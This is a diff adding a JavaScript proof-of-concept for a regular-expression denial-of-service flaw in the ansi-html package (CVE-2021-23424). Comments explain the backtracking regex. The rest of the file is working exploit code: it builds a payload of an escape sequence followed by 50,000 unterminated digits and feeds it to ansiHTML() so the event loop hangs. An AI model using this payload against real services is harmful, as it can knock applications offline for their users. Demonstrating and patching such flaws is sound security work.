@@ -1,0 +1,23 @@
+```javascript
+// ReDoS vulnerability in ansi-html (CVE-2021-23424)
+// The internal regex /\033\[(\d+)*m/g used in index.js's replace() call
+// contains a classic "evil regex" nested-quantifier pattern (\d+)* that
+// causes catastrophic exponential backtracking when it hits a long run
+// of digits with no closing 'm'.
+
+const ansiHTML = require("ansi-html");
+
+const ESC = String.fromCharCode(27);
+
+// A small valid ANSI sequence first so the initial _regANSI.test(text)
+// gate passes, followed by an unterminated long digit run that the
+// vulnerable /\033\[(\d+)*m/g regex will pathologically backtrack on.
+const payload = ESC + "[1m" + ESC + "[" + "9".repeat(50000);
+
+console.log("Calling ansiHTML() with malicious payload, this will hang the event loop...");
+const start = Date.now();
+
+ansiHTML(payload);
+
+console.log("Finished in", Date.now() - start, "ms");
+```
